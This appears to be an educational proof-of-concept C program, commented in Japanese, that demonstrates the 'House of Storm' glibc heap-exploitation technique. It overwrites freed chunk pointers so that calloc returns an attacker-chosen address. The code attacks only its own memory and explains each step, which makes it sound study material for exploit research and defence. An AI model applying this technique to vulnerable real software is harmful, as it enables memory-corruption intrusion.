/*

2.26 における House of Storm の POC

2.26〜2.28 では、これを動かすには tcache が
満杯になっている必要があります。それ以降は、unsorted bin 攻撃に対する
パッチにより、この手法は動作しなくなります。

この手法は、unsorted bin のチャンク(chunk)と large bin のチャンクを
組み合わせて編集することで、ユーザーが選んだメモリ上のアドレスに 'size' を書き込みます。
そのチャンクは unsorted bin から取り出されることになります。

これが起こった後、この 'fake'(偽)の位置にあるサイズが
割り当てのサイズと同じであれば、
そのチャンクがユーザーに返されます。

この攻撃により、任意のチャンクをユーザーに返させることができます。
これには次のものが必要です。
- 解放済みの unsorted bin チャンクへの書き込み
- 解放済みの large bin チャンクへの書き込み
- 標的のメモリアドレスが既知であること
- ヒープチャンクの上位ビットのアドレスが既知であること

Written by Maxwell "Strikeout" Dulin
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char filler[0x60];
char target[0x60]; 

void init(){
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
        // clearenv();
}

// サイズ用にシフトする量と、largebin 上のオフセットを求めます。
// 動作するには、有効な最小サイズのチャンクである必要があります。
int get_shift_amount(char* pointer){
	
	int shift_amount = 0;
	long long ptr = (long long)pointer;	
	
	while(ptr > 0x20){
		ptr = ptr >> 8; 
		shift_amount += 1; 
	}	

	return shift_amount - 1; // ゼロになる「直前」の量が欲しいのです
}

int main(){

	init();

        char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
	int* tcaches[7];

	puts("House of Storm"); 
	puts("======================================"); 
	puts("エクスプロイトのためにチャンクを準備します");
	puts("1つのチャンクを unsorted bin に、もう1つを large bin に入れます");
	puts("unsorted bin のチャンクは、large bin のチャンクより大きくなければなりません。");
	/*
	1つのチャンクを unsorted bin に、もう1つを
	large bin に入れます。
	*/
	unsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 

	// 統合(merge)を防ぎます 
	malloc ( 0x18 ); 

	puts("割り当てる適切なチャンクサイズを見つけます。");
	puts("上で書き込んだチャンクのサイズと、ぴったり同じである必要があります。");
	/* 
	割り当てる適切なサイズを見つけます。
	ヒープの先頭の 'X' バイトを、チャンクの 'size' として
	使います。そして、攻撃が動作するには、
	ちょうどこのサイズのチャンクを割り当てる必要があります。

	そのために、ヒープアドレスの上位ビットを取り出し、
	そのサイズのチャンクを割り当てます。このサイズは、
	ヒープアドレスの上位バイトに由来します。

	NOTE: 
	- 4ビット目で失敗する確率が 1/2 あります。この値の4ビット目が
	  立っていると、サイズの比較は毎回失敗します。
	- (デモでは)失敗する確率がさらに 1/4 あります。mmap ビットが
	  立っている必要があるか、non-main arena ビットが立っていてはいけません。
	- これらの計算をしなくても、リークなしで相対上書きを使って
	  ブルートフォースすることは可能です。
	*/

	int shift_amount = get_shift_amount(unsorted_bin);	
	printf("シフト量: %d\n", shift_amount); 

	size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
	if(alloc_size < 0x10){
		printf("チャンクサイズ: 0x%lx\n", alloc_size);
		puts("チャンクサイズが小さすぎます");
		exit(1);
	}
	alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // サイズビットを取り除きます
	printf("この場合、チャンクサイズは 0x%lx です\n", alloc_size);

        // プログラムがクラッシュするかどうかを確認します
	/*
	サイズの4ビット目と 'non-main arena' ビットは、立っていてはいけません。そうでないと、チャンクが…。そのため、まずこれを確認する必要があります。 

	さらに、https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438 にあるコードは、
	次のいずれか1つが真であることを検証します。 
	- av == arena_for_chunk (mem2chunk (mem))
	- チャンクが mmap されている

	チャンクに 'non-main arena' ビットが立っていると、
	1つ目の条件は失敗します。 
	mmap ビットが立っていれば、これは通過します。 
	
	したがって、arenaが一致している必要があります(このデモでは、偽のチャンクは
	.bss セクションにあるため、明らかにそうはなりません)。あるいは、
	mmap ビットが立っている必要があります。

	以下のロジックは、サイズの4ビット目が立って「いない」こと、
	および mmap ビットが立っているか、non-main arena ビットが立って「いない」ことを
	検証します。これが満たされていれば、エクスプロイトは動作するはずです。
	*/
        if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){
                puts("割り当てサイズの4ビット目が立っているか、");
		puts("mmap と non-main arena のビットのチェックが失敗します");
                puts("もう一度試してください! :)");
                puts("終了します...");
                return 1;
        }

	// チャンクが TCache に入る場合は、TCache のスタッシュ(stashing)が
	// 起こらないように、TCache を満杯にする必要があります。
	if(alloc_size < 0x410){
		puts("標的チャンクのサイズが TCache のサイズ(0x20-0x410)の場合は、割り当てサイズの TCache を満杯にします");
		puts("TCache のスタッシュが使われるのを防ぐためです");


		// 適切なサイズの TCache を満杯にします
		for(int i = 0; i < 7; i++){
			tcaches[i] = malloc(alloc_size);
		}
		for(int i = 0; i < 7; i++){
			free(tcaches[i]);
		}
	}
	else{
		puts("TCache は満杯にしません");
	}

	large_bin  =  malloc ( 0x4d8 );  // size 0x4e0 
	// 統合(merge)を防ぎます 
	malloc ( 0x18 );

	// FIFO(先入れ先出し) 
	free ( large_bin );  // 小さいチャンクを先に入れます 
	free ( unsorted_bin );

	// 'large bin' のチャンクを large bin に入れます
	unsorted_bin = malloc(0x4e8);
	free(unsorted_bin);

	/*
	この時点で、large bin には1つのチャンクがあり、
	unsorted bin にも1つのチャンクがあります。 
	unsorted bin のチャンクは、large bin のチャンクより
	サイズが「大きい」必要がありますが、
	同じ bin の範囲内に収まっている必要があることに注意してください。

	このセットアップでは、large_bin にはサイズ 0x4e0 の
	チャンクがあり、unsorted bin にはサイズ 0x4f0 の
	チャンクがあります。この手法は、unsorted bin のチャンクが
	同じ bin に追加されるものの、チャンクサイズはより大きいことに
	依存しています。そのため、ヒープ風水(heap feng shui)を慎重に
	行う必要があります。
	*/

	// 書き込みたいアドレスです!
	fake_chunk = target - 0x10;

	puts("脆弱性! unsorted bin の 'bk' ポインタを、標的の位置で上書きします。\n これが、アロケータから取得したい標的の位置です"); 
	
	/*
	偽のチャンクのアドレスを、unsorted bin チャンクの
	'bk' ポインタに設定します。 

	これで 'unsorted_bin' 攻撃が発動しますが、これを行う
	主な目的ではありません。

	'unsorted_bin 攻撃' の発動後、'victim' ポインタは
	このアドレスに設定されます。目標は、このアドレスを
	アロケータから取得する方法を見つけることです。

	脆弱性!!
	*/
	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk

	// 有効なアドレスでありさえすればよいのです。 
	(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin->fd

	puts("後で、large bin の WRITE-WHERE プリミティブ(primitive)を使って、ヒープポインタを書き込みます。書き込み先は");
	puts("偽のチャンクの位置です。"); 
	puts("位置をずらして、このプリミティブを SIZE の値として使います。"); 
	puts("'オフセット'は、バイナリが PIE の場合(5)と PIE でない場合(2)で変わります。");
	puts("脆弱性その2!");
	puts("large bin の bk->nextsize を、偽のチャンクのサイズを置くアドレスで上書きします。");
	/* 
	これは、large bin における WRITE-WHERE プリミティブと見なせます。
	ただし、ここでは、これを使って偽のチャンクの 'size' を書き込みます。 

	そこで、https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579 を
	偽のサイズ用のアドレスに設定します。上の書き込み(bk_nextsize)は、
	これから下で上書きするポインタによって制御されます。
	書き込まれる値はヒープアドレス、つまり上の unsorted bin の
	チャンクのアドレスです。 

	この「鍵」はオフセットです。まず、0x18 を引きます。これは、
	上に示したコードで fd_nextsize に書き込むときのオフセットだからです。
	次に、下の -2 に注目してください。'ヒープアドレス' を
	アラインされていない位置に書き込み、
	それをサイズとして使います。例えば、ヒープアドレスが 0x123456 で、
	ポインタが 0x60006 に設定されているとします。このとき、次のように書き込まれます。
	- 0x60006: 0x56
	- 0x60007: 0x34
	- 0x60008: 0x12

	これで、'偽のサイズ' は 0x60008 にあり、0x60008 にある
	偽のチャンクにとって有効なサイズになります。この偽のサイズは、この偽のチャンクを
	アロケータから取得するために極めて重要です。 

	2つ目の脆弱性!!!

	// シフト量は、チャンクサイズを書き込む適切なオフセットを
	計算するために使われます。ポインタのサイズに応じて決まります。
	これはポインタのサイズに依存します。 
	*/
	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin->bk_nextsize

	/*
	この時点で、すべてを適切な形で破壊したので、
	これで動作するはずです。 

	この攻撃の目的は、破壊した 'bk' ポインタを
	好きな「どこか」に向けつつ、そのメモリを返させることです。
	これは、large bin のコードを使って、'bk' の位置に
	サイズを書き込むことで実現します。

	この calloc の呼び出しは、上で作った偽のチャンクへの
	ポインタを返します。 
	*/

	puts("値が書き込まれる対象のサイズで割り当てを行います。");
	puts("割り当てが起こると、狂乱が始まります"); 
	puts("unsorted bin に入ると、'large bin' のチャンクが使われて、"); 
	puts("標的の位置に偽の 'size' の値が書き込まれます。"); 
	puts("この後、標的は有効なサイズを持つことになります。"); 
	puts("次に、unsorted bin は、(unsorted_bin->bk にある)チャンクが有効な"); 
	puts("サイズを持つことを確認して、そのチャンクを bin から取り除きます。");
	puts("これで、任意のチャンクを取り出しました!");

	printf("書き換え前の文字列: %s\n", target);
	printf("文字列のポインタ: %p\n", target);

	puts("TCache を使わないようにするために、'malloc' の代わりに");
	puts("'calloc' を呼び出します。TCache を満杯にしておく必要があったのは、");	
	puts("スタッシュによってエクスプロイトが動作しなくなるからです");

	// arena_for_chunk マクロによっても、これはクラッシュする可能性があります
	// https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
	ptr = calloc(alloc_size, 1);
	strncpy(ptr, "\x41\x42\x43\x44\x45\x46\x47", 0x58 - 1);
	
	printf("書き換え後の文字列 %s\n", target);
	printf("偽のチャンクのポインタ: %p\n", ptr);

	return 0;
}
